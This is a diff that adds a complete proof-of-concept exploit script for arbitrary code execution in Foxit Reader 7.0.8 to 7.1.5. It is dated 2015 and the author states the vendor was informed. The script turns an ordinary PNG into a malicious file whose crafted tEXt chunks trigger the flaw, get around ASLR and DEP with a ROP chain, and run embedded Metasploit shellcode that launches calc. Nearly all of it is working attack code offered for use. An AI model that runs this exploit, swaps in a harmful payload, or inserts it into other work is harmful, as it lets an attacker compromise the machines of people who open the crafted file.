@@ -1,0 +1,130 @@
+# Exploit Title: Foxit Reader PNG Conversion Parsing tEXt chunk - Arbitrary Code Execution
+# Date: 07/07/2015
+# Exploit Author: Sascha Schirra
+# Vendor Homepage: https://www.foxitsoftware.com
+# Software Link: https://www.foxitsoftware.com/downloads/
+# Version: 7.0.8 - 7.1.5 (maybe also older versions) tested versions 7.1.5 and 7.0.8
+# Tested on: Windows 7 SP1
+# Vendor informed and bug confirmed: July 08th, 2015
+
+"""
+This is a PoC (ASLR/DEP bypass)
+For ASLR bypass jrsysCrypt.dll is used, which doesn't make use of ASLR
+For DEP bypass a ropchain is used which call ZwProtectVirtualMemory through fastsyscall.
+This script looks for a tEXt chunk in a png file and replace this chunk with two other tEXt chunks.
+The first of them triggers the vulnerability and the second one contains a ropchain and shellcode.
+"""
+
+import binascii
+import struct
+import re
+import sys
+
+p = lambda x:struct.pack('I', x)
+
+if len(sys.argv) < 2:
+    print('usage: %s <pngfile>' % sys.argv[0])
+    exit()
+
+print('Open file: %s' % sys.argv[1])
+with open(sys.argv[1],'rb') as f:
+    data = f.read()
+
+m = re.search('tEXt', data)
+if not m:
+    print('No tEXt chunk')
+    exit()
+print('tEXt chunk found')
+start = data[:m.start()-4]
+length = struct.unpack('>I', data[m.start()-4:m.start()])[0]
+end = data[m.end()+length + 4:]
+
+vulnChunk = 'tEXt\0' # vulnerable because of the missing keyword
+vulnChunk += 'A'*8
+vulnChunk += p(0x10041a14) # xchg eax, ecx; ret;
+vulnChunk += p(0x10067e0a) # xchg eax, ebp; add byte ptr [eax], al; add esp, 4; ret;
+vulnChunk += 'AAAA'
+vulnChunk += p(0x10013d24) # mov esp, ebp; pop ebp; ret;
+vulnChunk += 'A'*16
+vulnChunk += '\x0a\xd2' # Partial Overwrite This have to be changed on each system. Another solution is needed here.
+
+
+vulnlen = struct.pack('>I', 0x2b) # length os 0x2b is needed to overwrite 2 bytes of the this pointer.
+vulnChunkCRC32 = struct.pack('>i',binascii.crc32(vulnChunk))
+
+secondChunk = 'AAA\0'*(580) 
+secondChunk += p(0x10009b40) # Pointer to the following gadget: MOV EDX,DWORD PTR SS:[ESP+2C]; MOV EAX,DWORD PTR SS:[ESP+28]; PUSH EDX; MOV EDX,DWORD PTR SS:[ESP+24]; PUSH EAX; PUSH ESI; PUSH EDX; PUSH EDI; CALL DWORD PTR DS:[ECX+14]
+secondChunk += p(0x1007c853) # pop esi; pop edi; pop ebx; pop ebp; ret;
+secondChunk += p(0x1000ba26) # xchg eax, esp; rcr byte ptr [esi + 0x5d], 0x40; pop ebx; add esp, 0x18; ret;
+secondChunk += 'AAAA'*2
+secondChunk += p(0x1006265d) # mov eax, dword ptr [esp + 0xc]; push eax; call dword ptr [ecx + 8];
+
+
+# calc shellcode - metasploit
+buf =  "\x83\xc4\xce"
+buf += "\xda\xc8\xbb\x15\xee\x3a\x64\xd9\x74\x24\xf4\x5d\x33"
+buf += "\xc9\xb1\x30\x31\x5d\x18\x83\xed\xfc\x03\x5d\x01\x0c"
+buf += "\xcf\x98\xc1\x52\x30\x61\x11\x33\xb8\x84\x20\x73\xde"
+buf += "\xcd\x12\x43\x94\x80\x9e\x28\xf8\x30\x15\x5c\xd5\x37"
+buf += "\x9e\xeb\x03\x79\x1f\x47\x77\x18\xa3\x9a\xa4\xfa\x9a"
+buf += "\x54\xb9\xfb\xdb\x89\x30\xa9\xb4\xc6\xe7\x5e\xb1\x93"
+buf += "\x3b\xd4\x89\x32\x3c\x09\x59\x34\x6d\x9c\xd2\x6f\xad"
+buf += "\x1e\x37\x04\xe4\x38\x54\x21\xbe\xb3\xae\xdd\x41\x12"
+buf += "\xff\x1e\xed\x5b\x30\xed\xef\x9c\xf6\x0e\x9a\xd4\x05"
+buf += "\xb2\x9d\x22\x74\x68\x2b\xb1\xde\xfb\x8b\x1d\xdf\x28"
+buf += "\x4d\xd5\xd3\x85\x19\xb1\xf7\x18\xcd\xc9\x03\x90\xf0"
+buf += "\x1d\x82\xe2\xd6\xb9\xcf\xb1\x77\x9b\xb5\x14\x87\xfb"
+buf += "\x16\xc8\x2d\x77\xba\x1d\x5c\xda\xd0\xe0\xd2\x60\x96"
+buf += "\xe3\xec\x6a\x86\x8b\xdd\xe1\x49\xcb\xe1\x23\x2e\x23"
+buf += "\xa8\x6e\x06\xac\x75\xfb\x1b\xb1\x85\xd1\x5f\xcc\x05"
+buf += "\xd0\x1f\x2b\x15\x91\x1a\x77\x91\x49\x56\xe8\x74\x6e"
+buf += "\xc5\x09\x5d\x0d\x88\x99\x3d\xd2"
+
+
+shellcode=buf
+rop = ''
+# Write Size to data section
+rop += p(0x1002d346) #pop eax; ret
+rop += p(0x100aa004) # data section
+rop += p(0x100012ca) #pop ecx; ret
+rop += p(0x1000)
+
+# Write baseaddr (esp) to data section
+rop += p(0x1001dd25) #mov dword ptr [eax], ecx; ret;
+rop += p(0x1007b25c) #push esp; add eax, 0x20; pop ebx; ret;
+rop += p(0x1002d346) #pop eax; ret
+rop += p(0x100aa008) # data section
+rop += p(0x1004eacc) #mov dword ptr [eax], ebx; pop ebx; ret;
+rop += p(0xdeadc0de)
+
+# dereference syscall and call it
+rop += p(0x1002d346) #pop eax; ret
+rop += p(0x7ffe0300) # fastsyscall
+rop += p(0x10010ff4) #mov ecx, dword ptr [eax]; mov eax, [ecx]; ret;
+rop += p(0x1002d346) #pop eax; ret
+rop += p(0xd7) #syscall
+rop += p(0x10081541) #push ecx;cld; ret
+
+rop += p(0x100801f5) # 6xpop; ret
+rop += p(0xdeadc0de)
+rop += p(0xffffffff)
+rop += p(0x100aa008) # datasection Pointer to baseaddress
+rop += p(0x100aa004) # datasection Pointer to size
+rop += p(0x40)
+rop += p(0x100aa00c)
+rop += p(0x1006c63b) # push esp, ret
+
+rop += shellcode
+
+secondChunk +=rop
+secondChunk += 'A'*4000
+secondChunk = secondChunk[:4000] 
+
+secondChunkLen = struct.pack('>i', len(secondChunk)+1) 
+secondChunk = 'tEXt'+'\0'+secondChunk
+secondChunkCRC32 = struct.pack('>i',binascii.crc32(secondChunk))
+
+with open('exploit_'+sys.argv[1],'wb') as f:
+	f.write(start+(secondChunkLen + secondChunk + secondChunkCRC32) +vulnlen + vulnChunk + vulnChunkCRC32+ end)
+
+print('Exploit file created: %s' % ('exploit_'+sys.argv[1]))
